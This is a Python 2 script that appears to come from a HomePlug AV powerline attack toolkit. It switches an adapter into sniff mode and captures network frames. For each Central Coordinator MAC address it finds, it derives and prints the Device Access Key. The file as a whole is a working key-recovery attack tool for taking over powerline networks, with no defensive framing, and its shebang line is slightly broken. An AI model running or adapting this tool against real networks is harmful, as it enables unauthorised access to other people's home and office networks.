#!/usr/bin/en python2

import sys
import binascii
from layerscapy.HomePlugAV import *
from optparse import OptionParser
from genDAK import *

dictio = {}

def appendindic(pkt):
    macad = iter(binascii.hexlify(pkt.load[0xe:0xe+6]))
    macad = ':'.join(a+b for a,b in zip(macad, macad))
    if macad not in dictio.keys() and macad != "00:00:00:00:00:00":
        dictio[macad] = DAKgen(macad).generate()
        print "\t Found CCo: %s (DAK: %s)" % (macad, dictio[macad]) 

if __name__ == "__main__":
    usage = "usage: %prog [options] arg"
    parser = OptionParser(usage)
    parser.add_option("-i", "--iface", dest="iface", default="eth0",
        help="select an interface to Enable sniff mode and sniff indicates packets", metavar="INTERFACE")
    parser.add_option("-s", "--source", dest="sourcemac", default="00:c4:ff:ee:00:00",
        help="source MAC address to use", metavar="SOURCEMARC")
    (options, args) = parser.parse_args()
    print "[+] Enabling sniff mode"
    pkt = Ether(src=options.sourcemac)/HomePlugAV()/SnifferRequest(SnifferControl=1) # We enable Sniff mode here
    sendp(pkt, iface=options.iface)
    print "[+] Listening for CCo station..."
    sniff(prn=appendindic, lfilter=lambda pkt:pkt.haslayer(HomePlugAV)) # capture the signal
